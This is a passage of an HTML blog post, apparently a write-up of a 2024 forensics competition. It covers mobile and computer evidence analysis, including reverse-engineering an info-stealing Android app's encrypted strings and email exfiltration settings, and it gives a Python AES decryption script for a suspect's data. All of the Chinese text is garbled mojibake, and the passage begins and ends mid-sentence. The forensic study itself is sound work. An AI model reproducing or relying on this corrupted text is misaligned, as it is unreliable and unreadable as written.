¼ä¸­çš„ä¸€ä¸ªæˆå‘˜å§“åè¢«é”™è¯¯ä¿®æ”¹ï¼Œè¯·ç¡®è®¤è¿™ä¸ªæˆå‘˜çš„åŸå§‹æ­£ç¡®å§“åï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šå¼ ä¸‰)"></a>7.åˆ†ææ‰‹æœºæ£€æï¼Œæ¥ä¸Šé—®ï¼Œå…¶å®¹å™¨ä¸­å­˜åœ¨ä¸€ä»½æˆå‘˜åå•ï¼Œå«Œç–‘äººæ›¾ç»è¯¯è§¦å¯¼è‡´è¡¨æ ¼ä¸­çš„ä¸€ä¸ªæˆå‘˜å§“åè¢«é”™è¯¯ä¿®æ”¹ï¼Œè¯·ç¡®è®¤è¿™ä¸ªæˆå‘˜çš„åŸå§‹æ­£ç¡®å§“åï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šå¼ ä¸‰)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-184700713.png" class="">  <p>åœ¨Downloadä¸‹å¯ä»¥æ‰¾åˆ°dataå®¹å™¨ï¼Œç„¶åä½¿ç”¨TrueCryptæ¥æŒ‚è½½ï¼Œä¸æ˜¯è¯´VeraCryptå®Œç¾å…¼å®¹TrueCryptå®¹å™¨å—ï¼ŒèšŒã€‚å®¹å™¨é‡Œæœ‰ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªè¡¨æ ¼</p><p>è§‚å¯Ÿè¡¨æ ¼å¯ä»¥å‘ç°æ¯ä¸ªæˆå‘˜éƒ½æ˜¯ç”±é‚€è¯·äººæ¨èçš„ï¼Œè€Œé‚€è¯·äººéƒ½æ˜¯è¿™ä¸ªå›¢ä¼™çš„æˆå‘˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹å“ªä¸ªé‚€è¯·äººæ²¡æœ‰å‡ºç°åœ¨æˆå‘˜é‡Œï¼Œå¦‚æœæ²¡æœ‰å‡ºç°å°±ä»£è¡¨è¿™ä¸ªæˆå‘˜è¢«è¯¯ä¿®æ”¹äº†</p><h2 id="8-åˆ†ææ‰‹æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·ç¡®è®¤è¯¥æˆå‘˜çš„å¯¹åº”çš„æœ€é«˜ä»£ç†äººæ˜¯è°ï¼ˆä¸è€ƒè™‘æ€»éƒ¨ï¼‰ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šå¼ ä¸‰"><a href="#8-åˆ†ææ‰‹æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·ç¡®è®¤è¯¥æˆå‘˜çš„å¯¹åº”çš„æœ€é«˜ä»£ç†äººæ˜¯è°ï¼ˆä¸è€ƒè™‘æ€»éƒ¨ï¼‰ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šå¼ ä¸‰" class="headerlink" title="8.åˆ†ææ‰‹æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·ç¡®è®¤è¯¥æˆå‘˜çš„å¯¹åº”çš„æœ€é«˜ä»£ç†äººæ˜¯è°ï¼ˆä¸è€ƒè™‘æ€»éƒ¨ï¼‰ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šå¼ ä¸‰)"></a>8.åˆ†ææ‰‹æœºæ£€æï¼Œæ¥ä¸Šé¢˜ï¼Œè¯·ç¡®è®¤è¯¥æˆå‘˜çš„å¯¹åº”çš„æœ€é«˜ä»£ç†äººæ˜¯è°ï¼ˆä¸è€ƒè™‘æ€»éƒ¨ï¼‰ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šå¼ ä¸‰)</h2><h2 id="9-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·ç¡®è®¤åœ¨è¯¥ç»„ç»‡ä¸­ï¼Œæœ€é«˜å±‚çº§çš„å±‚æ¬¡æ˜¯å¤šå°‘ï¼Ÿï¼ˆä»æ€»éƒ¨å¼€å§‹ç®—ç¬¬ä¸€çº§ï¼‰-æ ‡å‡†æ ¼å¼ï¼š10"><a href="#9-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·ç¡®è®¤åœ¨è¯¥ç»„ç»‡ä¸­ï¼Œæœ€é«˜å±‚çº§çš„å±‚æ¬¡æ˜¯å¤šå°‘ï¼Ÿï¼ˆä»æ€»éƒ¨å¼€å§‹ç®—ç¬¬ä¸€çº§ï¼‰-æ ‡å‡†æ ¼å¼ï¼š10" class="headerlink" title="9.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·ç¡®è®¤åœ¨è¯¥ç»„ç»‡ä¸­ï¼Œæœ€é«˜å±‚çº§çš„å±‚æ¬¡æ˜¯å¤šå°‘ï¼Ÿï¼ˆä»æ€»éƒ¨å¼€å§‹ç®—ç¬¬ä¸€çº§ï¼‰(æ ‡å‡†æ ¼å¼ï¼š10)"></a>9.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·ç¡®è®¤åœ¨è¯¥ç»„ç»‡ä¸­ï¼Œæœ€é«˜å±‚çº§çš„å±‚æ¬¡æ˜¯å¤šå°‘ï¼Ÿï¼ˆä»æ€»éƒ¨å¼€å§‹ç®—ç¬¬ä¸€çº§ï¼‰(æ ‡å‡†æ ¼å¼ï¼š10)</h2><h2 id="10-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®ç¬¬äºŒå±‚çº§ï¼ˆä»æ€»éƒ¨å¼€å§‹ç®—ç¬¬ä¸€çº§ï¼‰äººå‘˜æœ€å¤šçš„äººæ˜¯å¤šå°‘äººï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š100"><a href="#10-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®ç¬¬äºŒå±‚çº§ï¼ˆä»æ€»éƒ¨å¼€å§‹ç®—ç¬¬ä¸€çº§ï¼‰äººå‘˜æœ€å¤šçš„äººæ˜¯å¤šå°‘äººï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š100" class="headerlink" title="10.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®ç¬¬äºŒå±‚çº§ï¼ˆä»æ€»éƒ¨å¼€å§‹ç®—ç¬¬ä¸€çº§ï¼‰äººå‘˜æœ€å¤šçš„äººæ˜¯å¤šå°‘äººï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š100)"></a>10.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®ç¬¬äºŒå±‚çº§ï¼ˆä»æ€»éƒ¨å¼€å§‹ç®—ç¬¬ä¸€çº§ï¼‰äººå‘˜æœ€å¤šçš„äººæ˜¯å¤šå°‘äººï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š100)</h2><h2 id="11-åˆ†ææ‰‹æœºæ£€æï¼Œæœºä¸»å…±å¼€å¯äº†å‡ æ¬¾APPåº”ç”¨åˆ†èº«ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š3"><a href="#11-åˆ†ææ‰‹æœºæ£€æï¼Œæœºä¸»å…±å¼€å¯äº†å‡ æ¬¾APPåº”ç”¨åˆ†èº«ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š3" class="headerlink" title="11.åˆ†ææ‰‹æœºæ£€æï¼Œæœºä¸»å…±å¼€å¯äº†å‡ æ¬¾APPåº”ç”¨åˆ†èº«ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š3)"></a>11.åˆ†ææ‰‹æœºæ£€æï¼Œæœºä¸»å…±å¼€å¯äº†å‡ æ¬¾APPåº”ç”¨åˆ†èº«ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š3)</h2><h2 id="12-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æœºä¸»ç°åœ¨å®‰è£…äº†å‡ æ¬¾å³æ—¶é€šè®¯è½¯ä»¶ï¼ˆå¾®åšé™¤å¤–ï¼‰ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š1"><a href="#12-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æœºä¸»ç°åœ¨å®‰è£…äº†å‡ æ¬¾å³æ—¶é€šè®¯è½¯ä»¶ï¼ˆå¾®åšé™¤å¤–ï¼‰ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š1" class="headerlink" title="12.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æœºä¸»ç°åœ¨å®‰è£…äº†å‡ æ¬¾å³æ—¶é€šè®¯è½¯ä»¶ï¼ˆå¾®åšé™¤å¤–ï¼‰ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š1)"></a>12.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®æœºä¸»ç°åœ¨å®‰è£…äº†å‡ æ¬¾å³æ—¶é€šè®¯è½¯ä»¶ï¼ˆå¾®åšé™¤å¤–ï¼‰ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š1)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-202323686.png" class="">  <p>é¢˜ç›®è¯´çš„æ˜¯å³æ—¶é€šè®¯è½¯ä»¶.æ‰€ä»¥åº”è¯¥ä¸åŒ…æ‹¬æŠ–éŸ³è¿™ç§ã€‚</p><h2 id="13-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®å‹’ç´¢æœºä¸»çš„è´¦å·æ˜¯å¤šå°‘ï¼ˆéå¾®ä¿¡IDï¼‰ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šAB123CD45"><a href="#13-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®å‹’ç´¢æœºä¸»çš„è´¦å·æ˜¯å¤šå°‘ï¼ˆéå¾®ä¿¡IDï¼‰ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šAB123CD45" class="headerlink" title="13.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®å‹’ç´¢æœºä¸»çš„è´¦å·æ˜¯å¤šå°‘ï¼ˆéå¾®ä¿¡IDï¼‰ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šAB123CD45)"></a>13.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®å‹’ç´¢æœºä¸»çš„è´¦å·æ˜¯å¤šå°‘ï¼ˆéå¾®ä¿¡IDï¼‰ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šAB123CD45)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-202917851.png" class="">  <h2 id="14-åˆ†ææ‰‹æœºæ£€æï¼Œæ¥ä¸Šé—®ï¼Œè¯·é—®æœºä¸»é€šè¿‡æ­¤åº”ç”¨å…±åˆ é™¤äº†å¤šå°‘æ¡èŠå¤©è®°å½•-ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š2"><a href="#14-åˆ†ææ‰‹æœºæ£€æï¼Œæ¥ä¸Šé—®ï¼Œè¯·é—®æœºä¸»é€šè¿‡æ­¤åº”ç”¨å…±åˆ é™¤äº†å¤šå°‘æ¡èŠå¤©è®°å½•-ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š2" class="headerlink" title="14.åˆ†ææ‰‹æœºæ£€æï¼Œæ¥ä¸Šé—®ï¼Œè¯·é—®æœºä¸»é€šè¿‡æ­¤åº”ç”¨å…±åˆ é™¤äº†å¤šå°‘æ¡èŠå¤©è®°å½• ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š2)"></a>14.åˆ†ææ‰‹æœºæ£€æï¼Œæ¥ä¸Šé—®ï¼Œè¯·é—®æœºä¸»é€šè¿‡æ­¤åº”ç”¨å…±åˆ é™¤äº†å¤šå°‘æ¡èŠå¤©è®°å½• ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š2)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-203028996.png" class="">  <p>1æ¡</p><h2 id="15-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®ä¼šç›—å–æ‰‹æœºä¿¡æ¯çš„APPåº”ç”¨åŒ…åæ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šcom-lx-tt"><a href="#15-åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®ä¼šç›—å–æ‰‹æœºä¿¡æ¯çš„APPåº”ç”¨åŒ…åæ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šcom-lx-tt" class="headerlink" title="15.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®ä¼šç›—å–æ‰‹æœºä¿¡æ¯çš„APPåº”ç”¨åŒ…åæ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šcom.lx.tt)"></a>15.åˆ†ææ‰‹æœºæ£€æï¼Œè¯·é—®ä¼šç›—å–æ‰‹æœºä¿¡æ¯çš„APPåº”ç”¨åŒ…åæ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šcom.lx.tt)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-203229685.png" class="">  <img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-203343975.png" class="">  <h2 id="16-æ¥ä¸Šé¢˜ï¼Œè¯·é—®è¯¥è½¯ä»¶ä½œè€…é¢„ç•™çš„åº§æœºå·ç æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š40088855555"><a href="#16-æ¥ä¸Šé¢˜ï¼Œè¯·é—®è¯¥è½¯ä»¶ä½œè€…é¢„ç•™çš„åº§æœºå·ç æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š40088855555" class="headerlink" title="16.æ¥ä¸Šé¢˜ï¼Œè¯·é—®è¯¥è½¯ä»¶ä½œè€…é¢„ç•™çš„åº§æœºå·ç æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š40088855555)"></a>16.æ¥ä¸Šé¢˜ï¼Œè¯·é—®è¯¥è½¯ä»¶ä½œè€…é¢„ç•™çš„åº§æœºå·ç æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š40088855555)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-203658460.png" class="">  <p>é›·ç”µapkå¿«å–å‘ç°äº†åº”è¯¥é‚®ç®±ï¼Œä½†è¿™ä¸ªå¹¶ä¸æ˜¯åº§æœºå¥½ç ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æºç <br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-204825021.png" class=""><br>æœç´¢s0è¿™ç§çœ‹ä¸Šå»è¢«åŠ å¯†çš„å­—ç¬¦ï¼Œä¼šå‘ç°å…¶éƒ½ç»è¿‡ä¸€ä¸ªåŒ…ä¸‹çš„æ–¹æ³•å¤„ç†ï¼Œå³b.b.aä¸‹çš„aç±»çš„aæ–¹æ³•<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-205416140.png" class=""><br>æ ¹æ®æºç å¯ä»¥å‘ç°å…¶å¯†é’¥ä¸ºä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°å³E10ADC3949BA59ABBE56E057F20F883E,è€Œivæ˜¯å¯†é’¥çš„å‰16ä½å³E10ADC3949BA59AB<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-210832952.png" class=""><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°w0å’Œx0æ˜¯æ‹¼æ¥åè¿›è¡Œè§£å¯†çš„<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-210937081.png" class=""><br>40085222666</p><h2 id="17-æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå·å–æ•°æ®çš„æ”¶ä»¶é‚®ç®±åœ°å€çš„gmailé‚®ç®±æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šlx-gmail-com"><a href="#17-æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå·å–æ•°æ®çš„æ”¶ä»¶é‚®ç®±åœ°å€çš„gmailé‚®ç®±æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šlx-gmail-com" class="headerlink" title="17.æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå·å–æ•°æ®çš„æ”¶ä»¶é‚®ç®±åœ°å€çš„gmailé‚®ç®±æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šlx@gmail.com)"></a>17.æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå·å–æ•°æ®çš„æ”¶ä»¶é‚®ç®±åœ°å€çš„gmailé‚®ç®±æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šlx@gmail.com)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-210601082.png" class="">  <h2 id="18-æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå·å–æ•°æ®çš„å‘ä»¶é‚®ç®±åœ°å€æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šlx-gmail-com"><a href="#18-æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå·å–æ•°æ®çš„å‘ä»¶é‚®ç®±åœ°å€æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šlx-gmail-com" class="headerlink" title="18.æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå·å–æ•°æ®çš„å‘ä»¶é‚®ç®±åœ°å€æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šlx@gmail.com)"></a>18.æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå·å–æ•°æ®çš„å‘ä»¶é‚®ç®±åœ°å€æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šlx@gmail.com)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-212348015.png" class="">  <p>å¯ä»¥çœ‹åˆ°b()æ˜¯ä¸€ä¸ªå‘é€é‚®ä»¶çš„æ–¹æ³•,æœ€ç»ˆä¼šå°†è°·æ­Œçš„é‚®ç®±å’Œå‘é€çš„å†…å®¹ä¼ åˆ°aVar.a()é‡Œæˆ‘ä»¬æ­¥å…¥<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-212717062.png" class=""><br>å¯ä»¥å‘ç°ä¸€å¼€å§‹è¿›è¡Œäº†ä¸€ä¸ªè§£å¯†æ“ä½œ<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-212703014.png" class=""><br>å¯ä»¥å‘ç°é‚®ç®±</p><h2 id="19-æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå·å–æ•°æ®çš„å‘ä»¶é‚®ç®±å¯†ç æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šabc123"><a href="#19-æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå·å–æ•°æ®çš„å‘ä»¶é‚®ç®±å¯†ç æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šabc123" class="headerlink" title="19.æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå·å–æ•°æ®çš„å‘ä»¶é‚®ç®±å¯†ç æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šabc123)"></a>19.æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå·å–æ•°æ®çš„å‘ä»¶é‚®ç®±å¯†ç æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šabc123)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-213017792.png" class="">  <h2 id="20-æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå®šä¹‰æ”¶å‘ä»¶çš„åœ°å€å‡½æ•°æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼ša"><a href="#20-æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå®šä¹‰æ”¶å‘ä»¶çš„åœ°å€å‡½æ•°æ˜¯ä»€ä¹ˆï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼ša" class="headerlink" title="20.æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå®šä¹‰æ”¶å‘ä»¶çš„åœ°å€å‡½æ•°æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼ša)"></a>20.æ¥ä¸Šé¢˜ï¼Œæ¶æ„ç¨‹åºå®šä¹‰æ”¶å‘ä»¶çš„åœ°å€å‡½æ•°æ˜¯ä»€ä¹ˆï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼ša)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-213144138.png" class="">  <h1 id="è®¡ç®—æœºå–è¯"><a href="#è®¡ç®—æœºå–è¯" class="headerlink" title="è®¡ç®—æœºå–è¯"></a>è®¡ç®—æœºå–è¯</h1><h2 id="1-åˆ†æè®¡ç®—æœºæ£€æï¼Œå«Œç–‘äººåœ¨å°†å…¶ä¾µå…¬æ•°æ®å‡ºå”®å‰åœ¨Pycharmä¸­è¿›è¡Œäº†AESåŠ å¯†ï¼Œç”¨äºåŠ å¯†çš„keyæ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š1A23456ABCD"><a href="#1-åˆ†æè®¡ç®—æœºæ£€æï¼Œå«Œç–‘äººåœ¨å°†å…¶ä¾µå…¬æ•°æ®å‡ºå”®å‰åœ¨Pycharmä¸­è¿›è¡Œäº†AESåŠ å¯†ï¼Œç”¨äºåŠ å¯†çš„keyæ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š1A23456ABCD" class="headerlink" title="1.åˆ†æè®¡ç®—æœºæ£€æï¼Œå«Œç–‘äººåœ¨å°†å…¶ä¾µå…¬æ•°æ®å‡ºå”®å‰åœ¨Pycharmä¸­è¿›è¡Œäº†AESåŠ å¯†ï¼Œç”¨äºåŠ å¯†çš„keyæ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š1A23456ABCD)"></a>1.åˆ†æè®¡ç®—æœºæ£€æï¼Œå«Œç–‘äººåœ¨å°†å…¶ä¾µå…¬æ•°æ®å‡ºå”®å‰åœ¨Pycharmä¸­è¿›è¡Œäº†AESåŠ å¯†ï¼Œç”¨äºåŠ å¯†çš„keyæ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š1A23456ABCD)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-214530637.png" class="">  <p>ä»¿çœŸåæ‰“å¼€pycharm</p><h2 id="2-åˆ†æè®¡ç®—æœºæ£€æï¼Œèº«ä»½è¯ä¸ºâ€371963195112051505â€è¿™ä¸ªäººçš„æ‰‹æœºå·ç æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š13013524420"><a href="#2-åˆ†æè®¡ç®—æœºæ£€æï¼Œèº«ä»½è¯ä¸ºâ€371963195112051505â€è¿™ä¸ªäººçš„æ‰‹æœºå·ç æ˜¯å¤šå°‘ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼š13013524420" class="headerlink" title="2.åˆ†æè®¡ç®—æœºæ£€æï¼Œèº«ä»½è¯ä¸ºâ€371963195112051505â€è¿™ä¸ªäººçš„æ‰‹æœºå·ç æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š13013524420)"></a>2.åˆ†æè®¡ç®—æœºæ£€æï¼Œèº«ä»½è¯ä¸ºâ€371963195112051505â€è¿™ä¸ªäººçš„æ‰‹æœºå·ç æ˜¯å¤šå°‘ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼š13013524420)</h2><p>ä½¿ç”¨è§£å¯†è„šæœ¬è§£å¯†ï¼Œè®¡ç®—æœºä¸­çš„åŠ å¯†æ–‡ä»¶<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">encrypted_data, key, iv</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)  <span class="comment"># è§£å¯†</span></span><br><span class="line">    <span class="keyword">return</span> decrypted_data.decode()</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;65B2564BG89F16G9&#x27;</span>  <span class="comment"># ä¸åŠ å¯†æ—¶ç›¸åŒ</span></span><br><span class="line">iv = <span class="string">b&#x27;83E6CBEF547944CF&#x27;</span>  <span class="comment"># ä¸åŠ å¯†æ—¶ç›¸åŒ</span></span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&quot;encrypted_data.txt&quot;</span></span><br><span class="line">output_file = <span class="string">&quot;decrypted_data.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_data</span>(<span class="params">input_file, output_file, key, iv</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f_in, <span class="built_in">open</span>(output_file, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> tqdm(f_in, desc=<span class="string">&quot;Processing&quot;</span>):</span><br><span class="line">            parts = line.strip().split(<span class="string">&#x27;,&#x27;</span>)  <span class="comment"># åˆ†å‰²è¡Œ</span></span><br><span class="line">            index = parts[<span class="number">0</span>]  <span class="comment"># è·å–ç´¢å¼•</span></span><br><span class="line">            f_out.write(index + <span class="string">&quot;,&quot;</span>)  <span class="comment"># å†™å…¥ç´¢å¼•</span></span><br><span class="line"></span><br><span class="line">            decrypted_parts = []</span><br><span class="line">            <span class="keyword">for</span> part <span class="keyword">in</span> parts[<span class="number">1</span>:]:</span><br><span class="line">                <span class="comment"># å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚</span></span><br><span class="line">                encrypted_part = <span class="built_in">bytes</span>.fromhex(part)</span><br><span class="line">                decrypted_data = aes_decrypt(encrypted_part, key, iv)  <span class="comment"># è§£å¯†</span></span><br><span class="line">                decrypted_parts.append(decrypted_data)</span><br><span class="line"></span><br><span class="line">            f_out.write(<span class="string">&quot;,&quot;</span>.join(decrypted_parts) + <span class="string">&quot;\n&quot;</span>)  <span class="comment"># å†™å…¥è§£å¯†åçš„æ•°æ®</span></span><br><span class="line"></span><br><span class="line">process_data(input_file, output_file, key, iv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;è§£å¯†å®Œæˆã€‚&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-220131875.png" class=""><br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-220153869.png" class=""><br>15075547510</p><h2 id="3-åˆ†æè®¡ç®—æœºæ£€æï¼Œå¯¹è§£å¯†åçš„èº«ä»½è¯æ•°æ®åˆ—è¿›è¡Œå•åˆ—å»é‡æ“ä½œï¼Œé‡å¤çš„èº«ä»½è¯å·ç æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ-èº«ä»½è¯ä¸ç”„åˆ«çœŸå‡-æ ‡å‡†æ ¼å¼ï¼š100"><a href="#3-åˆ†æè®¡ç®—æœºæ£€æï¼Œå¯¹è§£å¯†åçš„èº«ä»½è¯æ•°æ®åˆ—è¿›è¡Œå•åˆ—å»é‡æ“ä½œï¼Œé‡å¤çš„èº«ä»½è¯å·ç 